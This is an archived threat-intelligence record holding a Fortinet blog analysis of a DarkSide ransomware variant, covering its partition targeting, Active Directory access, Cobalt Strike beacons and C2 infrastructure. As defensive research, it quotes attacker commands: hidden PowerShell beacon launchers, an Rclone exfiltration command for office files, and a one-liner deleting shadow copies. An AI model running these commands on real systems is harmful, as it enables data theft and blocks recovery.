{
    "id": "e9633d48-686b-41a1-a5da-2b4e292904d0",
    "created_at": "2023-01-12T15:00:38.811686Z",
    "updated_at": "2025-03-27T02:09:17.785606Z",
    "deleted_at": null,
    "sha1_hash": "0075dbdf180e02c784291d9c69598f66e8951210",
    "title": "2021-05-17 - Newly Discovered Function in DarkSide Ransomware Variant Targets Disk Partitions",
    "authors": "",
    "file_creation_date": "2022-05-28T02:16:50Z",
    "file_modification_date": "2022-05-28T02:16:50Z",
    "file_size": 617344,
    "plain_text": "# Newly Discovered Function in DarkSide Ransomware Variant Targets Disk Partitions\n\n**[fortinet.com/blog/threat-research/newly-discovered-function-in-darkside-ransomware-variant-targets-disk-partitions](https://www.fortinet.com/blog/threat-research/newly-discovered-function-in-darkside-ransomware-variant-targets-disk-partitions)**\n\nMay 17, 2021\n\nThreat Research\n\nBy [Fred Gutierrez,](https://www.fortinet.com/blog/search?author=Fred+Gutierrez) [Gayathri Thirugnanasambandam, and Val Saengphaibul | May 17, 2021](https://www.fortinet.com/blog/search?author=+Gayathri+Thirugnanasambandam)\n\n**[FortiGuard Labs Threat Research Report](https://www.fortinet.com/fortiguard/labs.html?utm_source=blog&utm_medium=campaign&utm_campaign=FortiGuardLabs)**\n\n**Affected Platforms: Windows**\n\n**Level of Risk: HIGH/MEDIUM. This ransomware variant, written by the same criminals that**\ntargeted Colonial Pipeline, exhibits the ability to detect and compromise partitioned hard\ndrives, a behavior not seen before.\n\n**Impact: MEDIUM. This attack currently appears to be confined to targeted organizations and**\nis not the result of widespread wormlike activity.\n\n\n-----\n\n## Introduction of DarkSide Ransomware\n\nFortiGuard Labs has uncovered additional tactics used by the threat actors that attacked\n[Colonial Pipeline. In this different DarkSide ransomware variant, FortiGuard Labs](https://www.fortinet.com/blog/threat-research/protecting-critical-infrastructure-colonial-pipeline-darkside-and-ransomware?utm_source=blog&utm_campaign=protecting-critical-infrastructure-colonial-pipeline-darkside-and-ransomware)\nresearchers uncovered an ability to seek out partition information and compromise multiple\ndisk partitions.\n\nAt the time of discovery, FortiGuard Labs researchers believed the ransomware was seeking\nout partitions to find possible hidden partitions setup by systems administrators to hide\nbackup files. But further analysis confirmed an even more advanced technique. The\nDarkSide Ransomware variant seeks out partitions on a multi-boot system to find additional\nfiles to encrypt, thereby causing greater damage and an increased incentive to pay a ransom\nto recover files.\n\nIn this blog the reader will discover:\n\n1. DarkSide ransomware code is efficient and well-constructed, indicating that their\n\ncybercriminal organization includes experienced software engineers\n2. The DarkSide ransomware variant (NOT the version used to disrupt Colonial Pipeline\n\noperations) is advanced in nature and was observed to seek out partitions in a multiboot environment to create further damage. It also seeks out the domain controller and\nconnects to its active directory via LDAP anonymous authentication.\n3. Additional insight on the files used by, and associated with, DarkSide was uncovered\n\nby the FortiGuard Incident Response team during recent engagements.\n4. The use of a well-known (to threat researchers) bulletproof host that has been used by\n\na wide variety of malicious actors for numerous nefarious activities over the years,\nincluding the 2016 DNC elections attack in the United States.\n\n## Expanded Analysis of the DarkSide Ransomware Variant by FortiGuard Labs\n\nFortiGuard Labs encountered novel techniques in this DarkSide ransomware variant\ncybercriminal organization not seen before in ransomware. The DarkSide ransomware\nvariant[1] was obtained through our partnership with CTA.\n\nThis ransomware sample, unrelated to the Colonial Pipeline campaign, was programmed\nefficiently with very little wasted space, and compiler bloat has been kept to a minimum,\nwhich is unusual for most malware. While the file size is relatively small for malware (57,856\nbytes), it can deliver a much-larger-than-expected payload. The following section will look\ncloser at two of the more unique functions that this DarkSide variant carries out. One deals\nwith Active Directory and the other is concerned with partitions.\n\n\n-----\n\nMalicious actors know that Active Directory is basically a goldmine of network information. In\nthis campaign, the DarkSide group included an Active Directory attack in their ransomware\nsoftware. To accomplish this, it first attempts to look for domain controllers.\n\nFigure 1: finding domain controllers\n\nIf any domain controllers are found, it will then use them to try and connect to the Active\nDirectory. However, because permissions are usually required to do this, the DarkSide\nransomware variant attempts to use LDAP to authenticate anonymously. Note the use of a\nnull password and a null username in the following sequence:\n\nFigure 2: LDAP anonymous authentication\n\nThis DarkSide ransomware variant may then use COM to interface with Active Directory\nitself. If successful, the malware attempts to delete certain variables, such\nas defaultNamingContext and dnsHostName.\n\nAfter issuing Active Directory queries, the ransomware then attempts to encrypt files in\nnetwork shares found in this section of the code. Note that DarkSide makes a point to avoid\nshares named C$ and ADMIN$, and also first checks to see if a share is writeable before\ntrying to encrypt files in it. C$ and ADMIN$ are default and known admin shares, which are\nsupposed to only be accessible by members of the Administrators group or the Backup\nOperators group if they have not been disabled or reconfigured. It seems likely that DarkSide\navoids these shares on the chance that it may not be running in the context of an\nAdministrator and attempts to access them could potentially trigger an alert.\n\nA more unique operation was found elsewhere. In a similar fashion to Petya (also known as\nNotPetya) ransomware, DarkSide also scans the hard drive to perform additional actions. In\nthe case of Petya, the MBR (Master Boot Record) was infected so that when a user turned\non the computer it booted a ransom note straight from the MBR and essentially rendered the\ncomputer useless. (For more information on how this was done, please refer to our Petya\nblog [here.) In the case of the DarkSide ransomware, however, it scans the drive to see if it is](https://www.fortinet.com/blog/threat-research/petya-s-master-boot-record-infection?utm_source=blog&utm_campaign=petya-s-master-boot-record-infection)\na multi-boot system to find additional volumes/partitions to try and encrypt their files as well.\n(NOTE: While the technical definitions of partition and volume are different, the two will be\nused interchangeably for the purposes of this blog.)\n\nFigure 3: Loop through volumes\n\nAfter the malware finds a targeted drive type, it checks the version of Windows it is running\non. For systems running Windows 7 and above, the malware looks for volumes with a\nbootmgr file in it. The bootmgr file may be found in the root of the C:\\ drive or it may be\nstored in another volume.\n\nFigure 4: Newer OS\n\n\n-----\n\nFor systems older than Windows 7, DarkSide chooses a different approach. It calls the\nDeviceIoControl API using the IOCTL_DISK_GET_PARTITION_INFO_EX control code.\n(Incidentally, Petya also used this control code. Some of the similarities between the two\nattacks are quite interesting.) According to Microsoft, this control code retrieves extended\ninformation about the type, size, and nature of a disk partition. This DarkSide ransomware\nvariant, however, uses the results in a different manner.\n\nFigure 5: Partitions\n\nIf the partition style it finds is an MBR (Master Boot Record), it will go ahead and check to\nsee if this partition is bootable. If not, then it will try to mount the partition. This appears to be\na programming bug, as bootable partitions may contain databases and other relevant data.\nPerhaps DarkSide is looking to only encrypt files inside data partitions rather than those\nfound in bootable partitions.\n\nFigure 6: Possible MBR bug\n\nHowever, if the partition style is GPT (GUID [Globally Unique Identifier] Partition Table),\nDarkSide takes another step. The first entry in a GUID partition’s format is the partition’s\ntype, and as expected, it is defined by a GUID.\n\n**Partition Definition** **GUID**\n\nEFI System {C12A7328-F81F-11D2-BA4B-00A0C93EC93B}\n\nWindows Recovery Environment { DE94BBA4-06D1-4D40-A16A-BFD50179D6AC}\n\nFigure 7: Partition types\n\nIf either of these GUIDs match the results from the call to the DeviceIoControl API, then\nDarkSide skips these partitions and moves on to the next one. (Unlike Petya, it appears that\nDarkSide at least wants to leave the infected machines in a semi-recoverable state for\nobvious reasons.) At this point (whether an MBR data partition or a non-excluded GPT\nvolume), DarkSide goes ahead and attempts to mount the partition using the\nSetVolumeMountPointW API. Once a volume is successfully mounted, DarkSide then\nattempts to encrypt the files contained within.\n\nAs far as we have been able to determine, these actions are new to the ransomware scene.\nAs a result, the global cyber security community may not be properly protected against this\nattack strategy.\n\n\n-----\n\n## Additional Files Observed Being Used in an Alternate DarkSide Ransomware Campaign\n\nWhile the above sample came from trusted partners, the FortiGuard Incident Response\nteam has observed other activities related to the DarkSide Cybercriminals. The details\ngained from these observations shed additional light on the tactics and techniques used by\nthe DarkSide cybercriminals. For example, they provide further insight into their usage of an\nSMB beacon, an HTTPS beacon, an exfiltration component using a command line tool\nnamed Rclone, WMI activity, and malware execution.\n\n**SMB and HTTPS Beacon**\n\nFurther analysis of an SMB beacon used by DarkSide reveals Cobalt Strike PowerShell\ncode. Here, the environment variable %COMSPEC% has the value\nof “C:\\Windows\\System32\\cmd.exe” and provides command line arguments, unbeknownst to\nthe user and to evade detection, that start the PowerShell application minimized without\ncreating a new window. The encoded PowerShell code is the Cobalt Strike SMB Beacon\npayload:\n\n%COMPSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand <Encoded\nSMB Beacon payload>\n\nThe decoded PowerShell command creates a named pipe, “\\\\.\\pipe\\UIA_PIPE_”, in its SMB\nbeacon communication. The pipe is bi-directional; both server and client processes can read\nfrom and write to the pipe:\n\nCreateNamedPipeA(\\\\.\\pipe\\UIA_PIPE_xxxx, 3, 6, 1, 4b000, 4b000, 0, 0)\n\nAnother finding is the discovery of an HTTPs Beacon. The following PowerShell command\nruns the HTTPS BEACON payload on hosts that connect outbound to the malware’s\nCommand and Control (C2) server located at IP (185.180.197[.]86) . It does this using the\ncommand InternetConnectA(server:tailgatethenation.com, port: 443, ).\n\n%COMPSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand <Encoded\nHTTPS Beacon payload>\n\nThis C2 IP address, 185.180.197[.]86, was very active in 2019, and was observed again in\n2021-04-19 after a long pause. We do not know why this IP address remained dormant for\nover a year.\n\nFigure 11. Historical traffic from 2019 – 2021 for 185.180.197[.]86\n\nThe passive DNS entries for the C2 IP 185[.]180[.]197[.]86 are listed below. Other threat\nresearchers have reported this IP being used by DarkSide, and this gives some insight into\nthe kinds of data it is used for. As can be seen, prior to its use as a C2 server for\n\n\n-----\n\nransomware, it was primarily used for pornography.\n\nFigure 12. Historical passive DNS entries for 185.180.197[.]86\n\n## Further Examination of the DarkSide Ransomware C2: IP\n\nUpon further examination, the 185[.]180[.]197[.]86 IP address was found to be co-located in\nthe United States with KingServers B.V. KingServers has been classified as a bulletproof\n[host by the infosec community, and although based in the Netherlands, it has ties to Russia,](https://www.nbcnews.com/news/world/trail-russian-hackers-putin-s-revenge-siberia-n662571)\nwhere DarkSide is located.\n\nBulletproof hosting is a service provided by some hosting firms that provides considerable\nleniency in the kinds of material uploaded and distributed by their customers, or in the\nactivities they can engage in without getting taken down. KingServers is a hosting site well\nknown to the InfoSec community and has been covered extensively by security journalist\nBrian Krebs among others. Specifically, its hosting service was used in several notable\nattacks, such as attacks on an India-based IT outsourcing firm to perpetrate gift card fraud,\n[as well as for the 2016 DNC attacks in the United States.](https://krebsonsecurity.com/2017/01/the-download-on-the-dnc-hack/)\n\nReview of observed telemetry over a 30-day period highlights a concentration of traffic from\nU.S. based machines connecting to the DarkSide C2 server, with the United States at the top\n(60%), followed by the Netherlands (9%), Singapore (8%), Brazil (4%), and Great Britain\n[(4%). This corresponds to reports that Darkside netted at least $60 million in its first seven](https://blog.chainalysis.com/reports/ransomware-update-may-2021)\nmonths, with $46 million coming in the first three months of this year.\n\nFigure 13. Traffic to 185[.]180[.]197[.]86 over 30 days\n\nFigure 14. Port 443 Traffic to 185.180.197[.]86 over 30 days\n\nThe Darkside ransomware attackers established command and control primarily with an\nRDP client running over Port 443, routed through TOR. Connections between Port 443 and\nthe C2 server 185[.]180[.]197[.]86:443 over a 30-day period reveal a concentration of traffic\nfrom U.S. based machines, with the United States at the top (82%), followed by the\nNetherlands (9%), with Great Britain, Iceland, and the Philippines/Switzerland (tied) rounding\nout the top 5 pings.\n\n## Exfiltration\n\nA Windows task discovered during our analysis shows how data exfiltration was initiated. It\nwas performed using Rclone, a command line tool used to sync files and directories between\na local system and cloud storage. In this case, the Rclone binary was renamed to evade\ndetection and dropped into the directory “C:\\Users\\Public\\”. The threat actor was looking to\nexfiltrate files created in the last year in the file formats of .xls, .xlsx, .doc, .docx, and .pdf.\n\n\n-----\n\nRclone copy <source> <dest> –max-age 1y –ignore-existing –drive-chunk-size 512M –\nbuffer-size=4G –transfers 20 –checkers 40 –include *.{xls,xlsx,doc,docx,pdf}\n\n## WMI Activity\n\nTo thwart data recovery, the ransomware payload attempted to access the Windows\nManagement Instrumentation (WMI) service.\n\nFurther compounding the impact of the attack, the de-obfuscated PowerShell command was\ndiscovered:\n\n“Get-WmiObject W32_Shadowcopy | ForEach-Object {$_.Delete();}”\n\nIt used the PowerShell cmdlet Get-WmiObject to delete all the Volume Shadow copies to\nthwart data recovery.\n\n## Malware Execution\n\nPsExec, a remote administration tool, was seen running the main malware payload (.exe).\nThe ransomware payload (.dll) was hosted on a shared folder, and a batch script was run to\ncopy the payload to the host’s C:\\Users\\Public directory. This payload was executed using\nrundll32, and a service was created to maintain persistence. There were multiple encryption\nroutines within the worker process, and the encryption routines were called directly to\nperform encryption and create ransomware artifacts.\n\n## DarkSide Ransmware Conclusion\n\nThis blog highlights that the threat actors behind DarkSide are not your average ransomware\nas a service group. Due to the sophistication of its attacks and code, it is also unlikely the\nmastermind of one person. The level of detail, effort, planning and time that the group has\nundertaken, not only creating the ransomware itself, but taking the time to note what data\nwas stolen, the amount of data, what it contained (as well as how much data in GB), and the\ntaken to organize and shame victims all highlight that this is the work of an organization with\nconsiderable resources and time.\n\nFor introductory insights into DarkSide relating to the Colonial Pipeline attack, please refer to\n[our previous blog and](https://www.fortinet.com/blog/threat-research/protecting-critical-infrastructure-colonial-pipeline-darkside-and-ransomware?utm_source=blog&utm_campaign=protecting-critical-infrastructure-colonial-pipeline-darkside-and-ransomware) [Threat Signal reports.](https://www.fortiguard.com/threat-signal-report/3943/colonial-pipeline-attack-attributed-to-darkside-ransomware-group)\n\n## Fortinet Protections\n\n**FortiGuard Labs**\n\nFortiGuard Labs has the following AV signatures in place for publicly available DarkSide\nRansomware and associated campaign samples as:\n\n\n-----\n\nPossibleThreat\n\nRiskware/Agent\n\nRiskware/PCH\n\nRiskware/PowerTool\n\nRiskware/RemoteUtilities\n\nRiskware/TorTool\n\nW32/DarkSide.B!tr.ransom\n\nW32/Filecoder.ODE!tr.ransom\n\nW32/Filecoder_DarkSide.A!tr\n\nW32/Filecoder_DarkSide.B!tr\n\nW32/GenKryptik.FBOV!tr\n\nW32/Packed.OBSIDIUM.BV!tr\n\nW64/Kryptik.BVR!tr\n\n[FortiGuard Labs has the following IPS signatures in place for Cobalt Strike Beacon Activity](https://www.fortinet.com/products/ips.html?utm_source=blog&utm_campaign=ips)\nas:\n\nBackdoor.Cobalt.Strike.Beacon\n\nFor TOR (darkweb) activity, FortiGuard Labs Application Control signatures detect all\nTOR-related activity.\n\n## FortiEDR\n\nAll related IOCs have been added to our Cloud intelligence and will be blocked if executed\non customer systems.\n\n[FortiEDR detects and blocks the WMI service access operation cited above, as follows:](https://www.fortinet.com/products/endpoint-security/fortiedr.html?utm_source=blog&utm_campaign=fortiedr)\n\nFortiEDR also detects and blocks “Rundll32.exe”, which is used to execute the ransomware\nworker process.\n\n**WebFiltering**\n\nAll available network IOCs are blocked by the client.\n\n\n-----\n\n**Other Mitigations**\n\nDue to the ease of disruption and potential for damage to daily operations, reputation, and\nthe unwanted release of personally identifiable information (PII), etc., it is essential to keep\nall AV and IPS signatures up to date.\n\nIt is also vital to ensure that all known vendor vulnerabilities within an organization are\naddressed and updated to protect against attackers establishing a foothold within a network.\n\nSince most ransomware attacks originate with a compromised end user, organizations are\nalso encouraged to conduct ongoing training sessions to educate and inform personnel\n[about the latest phishing/spearphishing attacks. They also need to encourage employees to](https://www.fortinet.com/resources/cyberglossary/phishing?utm_source=blog&utm_campaign=phishing)\nnever open attachments from someone they don't know and always treat emails from\nunrecognized/untrusted senders with caution. This can be accomplished through regular\ntraining sessions and impromptu tests using predetermined templates by an organizations'\ninternal security department. Simple user awareness training on how to spot emails with\nmalicious attachments or links could also help prevent initial access into the network.\n\nLearn more about Fortinet’s [FortiGuard Labs threat research and intelligence organization](https://www.fortinet.com/fortiguard/labs?utm_source=blog&utm_campaign=fortiguard-labs)\n[and the FortiGuard Security Subscriptions and Services portfolio.](https://www.fortinet.com/fortiguard/labs?tab=security-bundles&utm_source=blog&utm_campaign=security-bundles)\n\n_Learn more about Fortinet’s_ _[free cybersecurity training, an initiative of Fortinet’s Training](https://www.fortinet.com/training/cybersecurity-professionals?utm_source=blog&utm_medium=campaign&utm_campaign=Freetraininginitiative)_\n_Advancement Agenda (TAA), or about the_ _Fortinet Network Security Expert_\n_[program, Security Academy program, and](https://training.fortinet.com/local/staticpage/view.php?page=fnsa&utm_source=pr&utm_campaign=fnsa)_ _[Veterans program.Learn more about FortiGuard](https://www.fortinet.com/corporate/careers/vets.html?utm_source=blog&utm_campaign=fortivet)_\n_Labs global threat intelligence and research and the FortiGuard Security Subscriptions and_\n_Services portfolio._\n\n_1 SHA256:0a0c225f0e5ee941a79f2b7701f1285e4975a2859eb4d025d96d9e366e81abb9)_\n\n### Related Posts\n\nCopyright © 2022 Fortinet, Inc. All Rights Reserved\n\n[Terms of ServicesPrivacy Policy](https://www.fortinet.com/corporate/about-us/legal.html)\n| Cookie Settings\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-05-17 - Newly Discovered Function in DarkSide Ransomware Variant Targets Disk Partitions.pdf"
    ],
    "report_names": [
        "2021-05-17 - Newly Discovered Function in DarkSide Ransomware Variant Targets Disk Partitions.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535638,
    "ts_updated_at": 1743041357,
    "ts_creation_date": 1653704210,
    "ts_modification_date": 1653704210,
    "files": {
        "pdf": "https://archive.orkl.eu/0075dbdf180e02c784291d9c69598f66e8951210.pdf",
        "text": "https://archive.orkl.eu/0075dbdf180e02c784291d9c69598f66e8951210.txt",
        "img": "https://archive.orkl.eu/0075dbdf180e02c784291d9c69598f66e8951210.jpg"
    }
}